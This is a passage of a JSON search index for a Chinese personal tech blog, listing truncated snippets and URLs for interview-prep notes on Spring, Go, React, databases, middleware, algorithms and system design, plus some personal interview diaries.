这个是一个非常核心的注解，我们使用spr","lvl0":"启动流程和配置","lvl1":["框架","spring全家桶"],"lvl2":"摘要","objectID":"b65f7629a83e6b8cb0ce83f9e4b1075b","tags":[""],"url":"https://lyr-2000.github.io/post/04.%E6%A1%86%E6%9E%B6/01.spring%E5%85%A8%E5%AE%B6%E6%A1%B6/8.%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%92%8C%E9%85%8D%E7%BD%AE/"},{"content":"这个也太难了，springboot其实我了解的不是特别深入，然后这面试官就一直逮着我不放。。。后悔啊，下次得把springboot给背一背了","lvl0":"蘑菇街(一面)","lvl1":["个人面试","4月份面试"],"lvl2":"摘要","objectID":"0748d2792ee3094bb5a5a8b321ba8d47","tags":[""],"url":"https://lyr-2000.github.io/post/07.%E4%B8%AA%E4%BA%BA%E9%9D%A2%E8%AF%95/02.4%E6%9C%88%E4%BB%BD%E9%9D%A2%E8%AF%95/03.%E8%98%91%E8%8F%87%E8%A1%97%E4%B8%80%E9%9D%A2/"},{"content":"面了几次之后，总感觉自己每次说的都不太流利,这里特意写一下自己的面试稿子，到时候照着背吧，还有就是自己准备好一些话术，到时候就可以照着写了 先","lvl0":"面试稿子","lvl1":["个人面试","4月份面试"],"lvl2":"摘要","objectID":"762bd5189f70d31e4c709897b9143802","tags":[""],"url":"https://lyr-2000.github.io/post/07.%E4%B8%AA%E4%BA%BA%E9%9D%A2%E8%AF%95/02.4%E6%9C%88%E4%BB%BD%E9%9D%A2%E8%AF%95/02.%E9%9D%A2%E8%AF%95%E7%A8%BF%E5%AD%90/"},{"content":"这次面试实在是太尬了，后面的算法题我就一直尬在哪里想思路，然后面试官一直在那看着，我想到一个办法，然后面试官就说空间复杂度太大了，想办法让空","lvl0":"字节跳动(一面)","lvl1":["个人面试","4月份面试"],"lvl2":"摘要","objectID":"7fd36f8339f745fcc10fa40e9a205f92","tags":[""],"url":"https://lyr-2000.github.io/post/07.%E4%B8%AA%E4%BA%BA%E9%9D%A2%E8%AF%95/02.4%E6%9C%88%E4%BB%BD%E9%9D%A2%E8%AF%95/01.%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8%E4%B8%80%E9%9D%A2/"},{"content":"注意，这些代码我都会用GO来进行实现，参考： 想去看机会？这10道最高频的手撕代码题都会了吗？ - 云+社区 - 腾讯云 (tencent.com) 快速排序 这个非常的经典，必须","lvl0":"高频手撕代码","lvl1":["算法和数据结构","重点手撕代码"],"lvl2":"摘要","objectID":"d95b23c3c6152b16218e29a6d6a701fe","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/06.%E9%87%8D%E7%82%B9%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/09.%E9%AB%98%E9%A2%91%E6%89%8B%E5%8A%BF%E4%BB%A3%E7%A0%81/"},{"content":"主要参考下面几个链接 如何设计一个亿级消息量的IM系统 - InfoQ 写作平台 一个海量在线用户即时通讯系统（IM）的完整设计Plus - 云+社区 - 腾讯云 (tencent.com) .","lvl0":"设计一个IM系统","lvl1":["其他","业务问题"],"lvl2":"摘要","objectID":"c828c43430459867c47892cd8b552fbd","tags":[""],"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/02.%E4%B8%9A%E5%8A%A1%E9%97%AE%E9%A2%98/3.%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AAim%E7%B3%BB%E7%BB%9F/"},{"content":"可以参考下面这几个 如何设计并实现一个db连接池？ (juejin.cn)","lvl0":"设计一个数据库连接池","lvl1":["其他","业务问题"],"lvl2":"摘要","objectID":"58db918a0ebd3907fd3603927572553b","tags":[""],"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/02.%E4%B8%9A%E5%8A%A1%E9%97%AE%E9%A2%98/4.%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%B1%A0/"},{"content":"Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分","lvl0":"JWT","lvl1":["其他","一些技术"],"lvl2":"摘要","objectID":"5d66d98b97b9d234c728d30dc364f5bd","tags":[""],"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/03.%E4%B8%80%E4%BA%9B%E6%8A%80%E6%9C%AF/1.jwt/"},{"content":"MongoDB是由哪种语言写的 MongoDB用c++编写的，流行的开源数据库MySQL也是用C++开发的。C++1983年发行是一种使用广泛","lvl0":"面试问题汇总","lvl1":["数据库","MongoDB"],"lvl2":"摘要","objectID":"cc50303c9cf06df18a46fc36081da814","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/03.mongodb/1.%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"},{"content":"内存管理 什么是缓冲区溢出？有什么危害？其原因是什么？ 缓冲区溢出是指当计算机向缓冲区填充数据时超出了缓冲区本身的容量，溢出的数据覆盖在合法数据","lvl0":"面试问题整理","lvl1":["基础学科","操作系统"],"lvl2":"摘要","objectID":"4ded7b367bdacf7664902417e0e18988","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/01.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/7.%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/"},{"content":"TLS是啥 SSL/TLS协议其实就是一个安全通信的协议，https采用的就是这个协议来实现安全传输，这个地方主要会问你https的工作原理 TLS","lvl0":"安全相关","lvl1":["基础学科","计算机网络"],"lvl2":"摘要","objectID":"ef3c77da87cd4ad22333a39475ea190a","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/7.%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"},{"content":"01. Hook概述 Hook可以让你在不编写 class 的情况下使用 state 以及其他的 React 特性。 什么是 Hook? Hook 是一个特殊的函数，可以让你在函数组件里“钩入” React state 及 生命周","lvl0":"Hook概述","lvl1":["《React》笔记","Hook"],"lvl2":"摘要","objectID":"9db98a61e1782164faef130b03833761","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/03.hook/01.hook%E6%A6%82%E8%BF%B0/"},{"content":"","lvl0":"面试题","lvl1":["数据库","Redis"],"lvl2":"摘要","objectID":"5d399c29c3e481f2e26801413c1cdbeb","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/02.redis/7.%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"content":"Dubbo(读音[ˈdʌbəʊ])是阿里巴巴公司开源的一个高性能优秀的服务框架，使得应用可通过高性能的RPC 实现服务的输出和输入功能，可以和","lvl0":"Dubbo","lvl1":["框架","中间件"],"lvl2":"摘要","objectID":"b56ca4ec4d33bcfde3f976c9d1d72dde","tags":[""],"url":"https://lyr-2000.github.io/post/04.%E6%A1%86%E6%9E%B6/03.%E4%B8%AD%E9%97%B4%E4%BB%B6/4.dubbo/"},{"content":"Zookeeper是一个开源的分布式协调服务，由雅虎公司创建，由于最初雅虎公司的内部研究小组的项目大多以动物的名字命名，所以后来就以Zook","lvl0":"Zookeeper","lvl1":["框架","中间件"],"lvl2":"摘要","objectID":"b5366b710d7355959e250ff86653cce1","tags":[""],"url":"https://lyr-2000.github.io/post/04.%E6%A1%86%E6%9E%B6/03.%E4%B8%AD%E9%97%B4%E4%BB%B6/3.zookeeper/"},{"content":"RocketMQ是一个分布式消息和流数据平台，具有低延迟、高性能、高可靠性、万亿级容量和灵活的可扩展性。 RocketMQ实现原理 Rocket","lvl0":"RocketMQ","lvl1":["框架","中间件"],"lvl2":"摘要","objectID":"ec12a0459539f2476f20f4c3158015fa","tags":[""],"url":"https://lyr-2000.github.io/post/04.%E6%A1%86%E6%9E%B6/03.%E4%B8%AD%E9%97%B4%E4%BB%B6/2.rocketmq/"},{"content":"引用类型有哪些？有什么区别？ 引用类型主要分为强软弱虚四种： 强引用指的就是代码中普遍存在的赋值方式，比如A a = new A()这种。强引用关联的对象，","lvl0":"其他","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"075646936f965ab55e3e8af1723bcb16","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/12.%E5%85%B6%E4%BB%96/"},{"content":"知乎上就有好多现成的例子，我就拿敖丙的来举例吧 秒杀系统会遇到的几个问题 高并发 超卖 恶意请求 链接暴露 暴露了请求地址，被人恶意请求 数据库 请求太多，","lvl0":"秒杀系统设计","lvl1":["其他","业务问题"],"lvl2":"摘要","objectID":"c023ba261891d1101ae99a2449c97bf4","tags":[""],"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/02.%E4%B8%9A%E5%8A%A1%E9%97%AE%E9%A2%98/2.%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/"},{"content":"这个其实可以使用事务来实现，比如我们可以用MySQL，抢红包时先开启事务，然后加上行锁，修改完毕后我们提交事务，释放行锁 或者我们可以使用Re","lvl0":"设计一个抢红包功能","lvl1":["其他","业务问题"],"lvl2":"摘要","objectID":"1b61ec5e18b475c1eae67b43969ef394","tags":[""],"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/02.%E4%B8%9A%E5%8A%A1%E9%97%AE%E9%A2%98/1.%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E6%8A%A2%E7%BA%A2%E5%8C%85%E5%8A%9F%E8%83%BD/"},{"content":"算法（Algorithm）是指用来操作数据、解决程序问题的一组方法。对于同一个问题，使用不同的算法，也许最终得到的结果是一样的，但在过程中消","lvl0":"时间复杂度和空间复杂度","lvl1":["算法和数据结构","算法"],"lvl2":"摘要","objectID":"7f2c76ecb0224454eaebecf7febe455d","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/01.%E7%AE%97%E6%B3%95/03.%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%92%8C%E7%A9%BA%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6/"},{"content":"旋转数组的查找 33. 搜索旋转排序数组 - 力扣（LeetCode） (leetcode-cn.com) 区间查找 327. 区间和的个数 - 力扣（LeetCode） (leetcode-cn.com) 逆序数 剑指 Offer 51. 数组中的逆序对 -","lvl0":"二分查找","lvl1":["算法和数据结构","重点手撕代码"],"lvl2":"摘要","objectID":"70e6b5cd55fa34d97557187555966312","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/06.%E9%87%8D%E7%82%B9%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/07.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"},{"content":"二叉树转链表 114. 二叉树展开为链表 - 力扣（LeetCode） (leetcode-cn.com) 路径之和 113. 路径总和 II - 力扣（LeetCode） (leetcode-cn.com) 最近公共祖先 Loading Question\u0026hellip; - 力扣（LeetC","lvl0":"二叉树","lvl1":["算法和数据结构","重点手撕代码"],"lvl2":"摘要","objectID":"fdae1327577d886c098ae023da3b124e","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/06.%E9%87%8D%E7%82%B9%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/05.%E4%BA%8C%E5%8F%89%E6%A0%91/"},{"content":"最小路径和 64. 最小路径和 - 力扣（LeetCode） (leetcode-cn.com) 最长上升子序列 300. 最长递增子序列 - 力扣（LeetCode） (leetcode-cn.com) 三角形 120. 三角形最小路径和 - 力扣（","lvl0":"动态规划","lvl1":["算法和数据结构","重点手撕代码"],"lvl2":"摘要","objectID":"1a73f43e9777b684a427ead17a8fb568","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/06.%E9%87%8D%E7%82%B9%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/08.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"content":"最长回文串 409. 最长回文串 - 力扣（LeetCode） (leetcode-cn.com) 5. 最长回文子串 - 力扣（LeetCode） (leetcode-cn.com) 重复DNA序列 187. 重复的DNA序列 - 力扣（Leet","lvl0":"字符串","lvl1":["算法和数据结构","重点手撕代码"],"lvl2":"摘要","objectID":"59cdf9cb05b8ed520e2d715e953d5062","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/06.%E9%87%8D%E7%82%B9%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/06.%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"content":"使用队列实现栈 225. 用队列实现栈 - 力扣（LeetCode） (leetcode-cn.com) 使用栈实现队列 232. 用栈实现队列 - 力扣（LeetCode） (leetcode-cn.com) 包含min函数的栈 面试题30","lvl0":"栈、队列、堆","lvl1":["算法和数据结构","重点手撕代码"],"lvl2":"摘要","objectID":"0c67f3cc4b72eb262dc8e3ac9c33c52d","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/06.%E9%87%8D%E7%82%B9%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/02.%E6%A0%88%E9%98%9F%E5%88%97%E5%A0%86/"},{"content":"分糖果 575. 分糖果 - 力扣（LeetCode） (leetcode-cn.com) 跳跃游戏1 2 55. 跳跃游戏 - 力扣（LeetCode） (leetcode-cn.com) 最优加油方法 871. 最低加油次数 - 力扣（LeetCod","lvl0":"贪心算法","lvl1":["算法和数据结构","重点手撕代码"],"lvl2":"摘要","objectID":"8bdc6252e3a6488b066399cf5f741945","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/06.%E9%87%8D%E7%82%B9%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/03.%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/"},{"content":"n皇后 51. N 皇后 - 力扣（LeetCode） (leetcode-cn.com) 生成括号 22. 括号生成 - 力扣（LeetCode） (leetcode-cn.com) 求子集1 2 78. 子集 - 力扣（LeetCode） (leetcode-cn.com) 组合数之","lvl0":"递归、回溯、分治","lvl1":["算法和数据结构","重点手撕代码"],"lvl2":"摘要","objectID":"97f0d9d4500be84680bde7c52adf1fd6","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/06.%E9%87%8D%E7%82%B9%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/04.%E9%80%92%E5%BD%92%E5%9B%9E%E6%BA%AF%E5%88%86%E6%B2%BB/"},{"content":"链表逆序 剑指 Offer 24. 反转链表 - 力扣（LeetCode） (leetcode-cn.com) 链表求交点 面试题 02.07. 链表相交 - 力扣（LeetCode） (leetcode-cn.com) 链表求环 142. 环形链表 II - 力扣（Lee","lvl0":"链表","lvl1":["算法和数据结构","重点手撕代码"],"lvl2":"摘要","objectID":"749f7cfe1f87acadf57292122d04c2ab","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/06.%E9%87%8D%E7%82%B9%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/01.%E9%93%BE%E8%A1%A8/"},{"content":"11.旋转数组最小的数字（看） 剑指 Offer 11. 旋转数组的最小数字 - 力扣（LeetCode） (leetcode-cn.com) 解法一 二分查找 这题目主要还是考理解，下面简单介绍一下原理","lvl0":"11-20","lvl1":["算法和数据结构","剑指offer"],"lvl2":"摘要","objectID":"0f970c6e0c71f8412f73999d07bd03a4","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/05.%E5%89%91%E6%8C%87offer/2.11-20/"},{"content":"21.调整数组顺序使奇数位于偶数前面 剑指 Offer 21. 调整数组顺序使奇数位于偶数前面 - 力扣（LeetCode） (leetcode-cn.com) 哈哈，居然做出来了，这题其实最简单的方","lvl0":"21-30","lvl1":["算法和数据结构","剑指offer"],"lvl2":"摘要","objectID":"7c89704c7df5b4fbd7362bec0f7dbfd1","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/05.%E5%89%91%E6%8C%87offer/3.21-30/"},{"content":"前面那个CMU硕士100题大概知道了大致的算法和套路，目前还没时间去完善，下面的这个剑指offer我打算每道题都认真总结一下。。 题目链接：《","lvl0":"3-10","lvl1":["算法和数据结构","剑指offer"],"lvl2":"摘要","objectID":"cf3c9d5265b7b6848c7788dacc055da1","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/05.%E5%89%91%E6%8C%87offer/1.3-10/"},{"content":"31.栈的压入，弹出序列 剑指 Offer 31. 栈的压入、弹出序列 - 力扣（LeetCode） (leetcode-cn.com) 太难了，这题连思路都没有。。。只能看大佬的题解了呜呜呜 解法一：","lvl0":"31-40","lvl1":["算法和数据结构","剑指offer"],"lvl2":"摘要","objectID":"7bf1e049d2f47748c2f590d6d0570c38","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/05.%E5%89%91%E6%8C%87offer/4.31-40/"},{"content":"41.数据流中的中位数 剑指 Offer 41. 数据流中的中位数 - 力扣（LeetCode） (leetcode-cn.com) 这题先暂时跳过，后续再来研究一下 42.连续子数组的最大和 剑指 Offer 42. 连","lvl0":"41-50","lvl1":["算法和数据结构","剑指offer"],"lvl2":"摘要","objectID":"dfc9480fd8e2f0599732821632a3b5b9","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/05.%E5%89%91%E6%8C%87offer/5.41-50/"},{"content":"51.数组中的逆序对 剑指 Offer 51. 数组中的逆序对 - 力扣（LeetCode） (leetcode-cn.com) 这困难题先跳过吧，实在是把我刷累了 52.两个链表的第一个公共节点、 剑指","lvl0":"51-60","lvl1":["算法和数据结构","剑指offer"],"lvl2":"摘要","objectID":"1727f3cea437c1c8760e4955e459c932","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/05.%E5%89%91%E6%8C%87offer/6.51-60/"},{"content":"61.扑克牌中的顺子 剑指 Offer 61. 扑克牌中的顺子 - 力扣（LeetCode） (leetcode-cn.com) 没看懂这题啥意思。。。。我怎么这么菜啊 解法一：集合Set+遍历 首先我们","lvl0":"61-70","lvl1":["算法和数据结构","剑指offer"],"lvl2":"摘要","objectID":"4b12cc6f3f30dcdf47d12c4b827a0e5f","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/05.%E5%89%91%E6%8C%87offer/7.61-70/"},{"content":"下图是MySQL底层的一个简单的概括图 日志部分 主要就是这部分了，下面简单介绍一下mysql的三种日志 三种日志 bin log 主要记录所有数据库表结构变更","lvl0":"MySQL底层","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"0721b2f6a7a4b5f9ee5c4ebb173cf720","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/9.mysql%E5%BA%95%E5%B1%82/"},{"content":"这家公司详细信息我还没有太多了解，搞得面试官问我，我答不出来（下次面试前得先摸清楚详细信息） 数组和切片的区别 数组不可变，切片可变数据结构 | 面","lvl0":"福州蓝鲨信息技术（一面）","lvl1":["个人面试","3月份面试"],"lvl2":"摘要","objectID":"d86fcb804bc9c0f3cbbaab51691b7b74","tags":[""],"url":"https://lyr-2000.github.io/post/07.%E4%B8%AA%E4%BA%BA%E9%9D%A2%E8%AF%95/01.3%E6%9C%88%E4%BB%BD%E9%9D%A2%E8%AF%95/03.%E7%A6%8F%E5%B7%9E%E8%93%9D%E9%B2%A8%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/"},{"content":"案例演示 本节内容根据官方文档的 教程 编写。 在线demo 案例代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40","lvl0":"案例演示","lvl1":["《React》笔记","案例演示"],"lvl2":"摘要","objectID":"77e2d1df2ec530cbb817f630a415b682","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/04.%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA/01.%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA/"},{"content":"基本概念 说白了就是把请求的信息都放入一个队列，然后多台服务器从这个消息队列中获取所需要的的信息 常见的消息队列有那些 有如老牌的ActiveMQ","lvl0":"面试问题","lvl1":["框架","消息队列"],"lvl2":"摘要","objectID":"1ce640203ae2c1b1f37602c6c979ff36","tags":[""],"url":"https://lyr-2000.github.io/post/04.%E6%A1%86%E6%9E%B6/03.%E4%B8%AD%E9%97%B4%E4%BB%B6/1.%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/"},{"content":"Go的基本命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // 用于打包编译代码 go build // 来移除当前源码包和关联源码包里面编译生成的文件 go clean // 格式","lvl0":"其他","lvl1":["程序语言","Go"],"lvl2":"摘要","objectID":"f666742156fc8681d46d7850ffeb0e16","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/9.%E5%85%B6%E4%BB%96/"},{"content":"基础相关 map怎么实现顺序读取 把map中的key通过sort包排序 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;sort\u0026#34; ) func main() { var m = map[string]int{ \u0026#34;hello\u0026#34;:","lvl0":"面试问题","lvl1":["程序语言","Go"],"lvl2":"摘要","objectID":"545c1e6a0b2de637a9e3307a038084a5","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/10.%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/"},{"content":"11.React哲学（编写一个复杂组件的原则） React 最棒的部分之一是引导我们思考如何构建一个应用。在这篇文档中，我们将会通过 React 构建一个可搜索的产","lvl0":"React哲学","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"9115f5b647a86edb647cd067ff1a152f","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/11.react%E5%93%B2%E5%AD%A6/"},{"content":"10.组合vs继承 React 有十分强大的组合模式。我们推荐使用组合而非继承来实现组件间的代码重用。 包含关系 (组件组合) 有些组件无法提前知晓它们子组件","lvl0":"组合vs继承","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"fbb4bfcbcb94f2e3742ce14b0e36b0bf","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/10.%E7%BB%84%E5%90%88vs%E7%BB%A7%E6%89%BF/"},{"content":"09. 状态提升 (共享状态) 通常，多个组件需要反映相同的变化数据，这时我们建议将共享状态提升到最近的共同父组件中去。 在 React 中，将多个组件中需要共享的","lvl0":"状态提升 (共享状态)","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"af8eae9a59709d6fdf5bb4e47626057a","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/09.%E7%8A%B6%E6%80%81%E6%8F%90%E5%8D%87/"},{"content":"spring事务传播 为什么要有事务传播呢？默认情况下，spring是使用aop来实现事务的，我们只需要在方法上面加上 @Transactional 注解就可以了，但是这个","lvl0":"事务","lvl1":["框架","spring全家桶"],"lvl2":"摘要","objectID":"8aa830176415c6c3d904b30c4b6c8066","tags":[""],"url":"https://lyr-2000.github.io/post/04.%E6%A1%86%E6%9E%B6/01.spring%E5%85%A8%E5%AE%B6%E6%A1%B6/7.%E4%BA%8B%E5%8A%A1/"},{"content":"先说一下什么是循环依赖，循环依赖就是A引用了对象B，但是B对象又引用了A，如下图所示 springIOC就是我们不自己创建对象，而是使用spr","lvl0":"循环依赖","lvl1":["框架","spring全家桶"],"lvl2":"摘要","objectID":"f7730c45ad5cdb50c2adc3ed6b853f3f","tags":[""],"url":"https://lyr-2000.github.io/post/04.%E6%A1%86%E6%9E%B6/01.spring%E5%85%A8%E5%AE%B6%E6%A1%B6/6.%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/"},{"content":"","lvl0":"《React》笔记","lvl1":null,"lvl2":"摘要","objectID":"3ec27e5930ea74876cae738290cfeea7","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/25.react%E7%AC%94%E8%AE%B0/"},{"content":"01.高级指引","lvl0":"高级指引","lvl1":["《React》笔记","高级指引"],"lvl2":"摘要","objectID":"ba190d9896046546d6e677e61cfe33fa","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/02.%E9%AB%98%E7%BA%A7%E6%8C%87%E5%BC%95/01.%E9%AB%98%E7%BA%A7%E6%8C%87%E5%BC%95/"},{"content":"基础 什么是 Spring 框架? 我们一般说 Spring 框架指的都是 Spring Framework，它是很多模块的集合，使用这些模块可以很方便地协助我们进行开发。这些模块是：核","lvl0":"面试问题","lvl1":["框架","spring全家桶"],"lvl2":"摘要","objectID":"619b85b059cfd98e5969386400d12396","tags":[""],"url":"https://lyr-2000.github.io/post/04.%E6%A1%86%E6%9E%B6/01.spring%E5%85%A8%E5%AE%B6%E6%A1%B6/5.%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/"},{"content":"docker的底层原理 Docker 采用了 C/S 架构，包括客户端和服务端。Docker 守护进程 （ Daemon ）作为服务端接受来自客户端的请求，并处理这些请求（创建、运","lvl0":"Docker","lvl1":["软件和系统","软件使用"],"lvl2":"摘要","objectID":"8aca4d6e45e0c95b41f268c561f33c1f","tags":[""],"url":"https://lyr-2000.github.io/post/05.%E8%BD%AF%E4%BB%B6%E5%92%8C%E7%B3%BB%E7%BB%9F/01.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/03.docker/"},{"content":"设计模式的6大原则？ 1、开闭原则（Open Close Principle） 开闭原则的意思是：对扩展开放，对修改关闭。在程序需要进行拓展的时候，不能去修","lvl0":"面试问题","lvl1":["算法和数据结构","设计模式"],"lvl2":"摘要","objectID":"15318de6ed12054416eb94ad6e87bfe5","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/03.%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/04.%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/"},{"content":"不知道哪里抄来的 绝对路径用什么符号表示？当前目录、上层目录用什么表示？ 主目录用什么表示? 切换目录用什么命令？ 绝对路径： 如/etc/init.","lvl0":"Linux面试","lvl1":["软件和系统","系统相关"],"lvl2":"摘要","objectID":"5c971ea3c173f65e776e6eced30fde87","tags":[""],"url":"https://lyr-2000.github.io/post/05.%E8%BD%AF%E4%BB%B6%E5%92%8C%E7%B3%BB%E7%BB%9F/02.%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3/02.linux%E9%9D%A2%E8%AF%95/"},{"content":"工人分金条 分蛋糕 过桥问题 黑白帽子 